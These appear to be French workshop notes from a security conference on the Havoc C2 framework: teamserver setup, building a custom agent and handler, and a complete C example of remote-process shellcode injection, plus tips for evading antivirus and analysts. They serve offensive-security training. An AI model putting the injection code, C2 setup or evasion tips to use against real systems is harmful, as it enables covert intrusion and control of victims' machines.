# Workshop Diateam - UYBHYS 2023 - Guillaume Prigent

Voir slides et codes pour plus de détails.

## Introduction

Penser à passer l'hyperviseur de VirtualBox en Hyper-V sur Windows, pour optimiser les performances des VM.

Havoc = Framework C2 open-source très populaire.

Informations en vrac : 

- Modèle Client / Demon / Teamserver
- Teamserver = Serveur de contrôle permettant la connexion des clients sur des websockets
- Le Teamserver compile les demons à la volée à la demande des différents clients (comme sur Metasploit)
- Le Teamserver démarre avec un fichier de profil au format YAOTL
- Version 6 => API désactivée 
- Port par défaut : 40056
- Listeners HTTP / HTTPS / SMB nativement mais le SMB est surtout utilisé pour la latéralisation
- External C2 = Genre de proxy ajouté comme fusible pour ne pas se faire griller toutes les IP directement
- Une petite base de données SQLite est là pour stocker les informations des listeners de manière persistante : **/Havoc/Teamserver/data/havoc.db** 
- Deux options pour customiser un agent : 
  - Fork le code et modifier à la dure
  - Créer des "external agents" soi-même avec l'API pour les versions < 6 


Lancement Teamserver : 

```
hns@hns:~/Code/Havoc/Havoc/Teamserver/profiles$ vim diateam.yaotl
hns@hns:~/Code/Havoc/Havoc/Teamserver$ ./teamserver server --profile ./profiles/diateam.yaotl --debug -v
```

Lancement Client : 

```
hns@hns:~/Code/Havoc/Havoc/Client$ ./Havoc
```


Tips : 

- Éviter au maximum de lancer son Teamserver en tant que root pour ne pas se faire contrer facilement, il existe des vulnérabilités dans tous les serveurs C2 comme dans le reste des applications.
- Les dernières versions ont un paramètre permettant de sélectionner des plages de communication pour éviter les heures de bureau par exemple.



## Génération du payload

Attack => Payload => Choisir la configuration voulue

Au moment de la création du démon, les paramètres sont encodés sous forme de bytes et transmis ensuite, grâce aux **#define**

C'est un bon moyen de compiler à la volée en passant des paramètres arbitraires.

**Size / MagicValue / AgentID / Data binaire** = Schéma obligatoire à respecter pour notre futur custom agent.

En C++ il existe des techniques pour attraper les kills grâce aux signaux, pour réussir à prévenir le serveur C2 avant de mourir.



## Création de notre third party agent 

Deux éléments nécessaires :

- Handler (Python) qui enregistre les informations pour le Teamserver
- Agent (C++) que l'on peut reprendre depuis le code-source de Havoc



On utilise Python dans notre cas parce que Havoc fournit un petit wrapper Python, mais c'est faisable dans n'importe quel langage selon le temps et les moyens.



Chronologie : 

1) Requête POST de l'Agent vers le Teamserver avec les données obligatoires (Taille, MagicValue, AgentID, Data)
2) Le Teamserver vérifie la MagicValue puis transmet au Handler Python
3) Le Handler traite
4) Le Teamserver renvoie la réponse du Handler à l'Agent



Bien changer la valeur de cette ligne pour éviter les race conditions et les bugs :

```
#define DEMON_MAGIC_VALUE 0xDEADBEEF
```



Voir ce morceau (dans le fichier Demon.h) :

```
typedef struct
{
   [...]
} INSTANCE;
```

Extraire ce dont on a besoin et épurer pour notre propre agent.

Il y a beaucoup de définitions et de syscalls car il y a beaucoup de fonctions dans les agents Havoc, mais on peut faire beaucoup plus minimaliste.


Lancement : 

```
hns@hns:~/Code/Havoc/Havoc/Teamserver$ ./teamserver server --profile ./profiles/diateam.yaotl --debug -v

...

hns@hns:~/Code/Havoc/Horla_0.1$ python3 handler.py
```


Exemple d'une commande customisée :

```Python
class CommandSleep(Command)
    CommandId = COMMAND_SLEEP
    Name = "sleep"
    Description = "Change the agent sleep"
    Help = "Example : sleep 9"
    NeedAdmin = False
    Mitr = [] # Nécessaire
    Params = [ 
        CommandParam(
            name="sleeptime",
            is_file_path=False,
            is_optional=False
        ) 
    ]

    def job_generate(self, arguments: dict) -> bytes:
        print("[👉] 'sleep' command, job generation for ", arguments[ 'sleeptime' ]," seconds")

        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( arguments[ 'sleeptime' ] )

        return Task.buffer
```



Manière sympa de générer des payloads "dynamiquement" : ouvrir le fichier C avec le script Python et remplacer les valeurs des **#define** avant de compiler.

## Injection de shellcode

L'API Windows permet de tout faire nativement, sans tricks. En revanche, en général, les antivirus détectent directement les manipulations faisant appel à cette API.

Étapes : 

1. Trouver un processus cible

2. Ouvrir un handle sur le processus

3. Allocation de mémoire à l'intérieur du processus cible

4. On rend la zone mémoire exécutable avec "VirtualProtectEx"

5. Création du thread

   

Exemple minimaliste : 

```C
#include <windows.h>
#include <stdio.h>

// À modifier
unsigned char shellcode[] = {0x00, 0x00};
    
void main(){
    printf("Ready to execute shellcode\n");
    getchar();

    LPVOID pAllocatedMemory;
    HANDLE hProcess;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 892);

    pAllocatedMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    printf("Memory Allocated at %0x-16p \n");

    getchar();
    //memcpy(pAllocatedMemory, shellcode, sizeof(shellcode));
    WriteProcessMemory(hProcess, pAllocatedMemory, shellcode, sizeof(shellcode), 0);

    DWORD oldprotect;
    VirtualProtectEx(hProcess, pAllocatedMemory, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect);

    printf("Ready to execute Shellcode \n");
    getchar();

    HANDLE hThread;

    hThread = CreateRemoteThread(hProcess,NULL, 0, (LPTHREAD_START_ROUTINE)pAllocatedMemory, 0 , 0 , 0);

    WaitForSingleObject(hThread, -1);

}
```


Tips : 

- Ouvrir un handle doit forcément se faire sur un processus ayant des droits équivalents ou inférieurs, on ne peut pas élever ses privilèges de cette manière.
- Sur d'anciennes versions de Defender ou de certains autres antivirus, on peut contourner la détection en créant un thread suspendu que l'on activera après un certain temps.
- Les analystes font attention aux zones mémoires RWX mais moins aux RX.
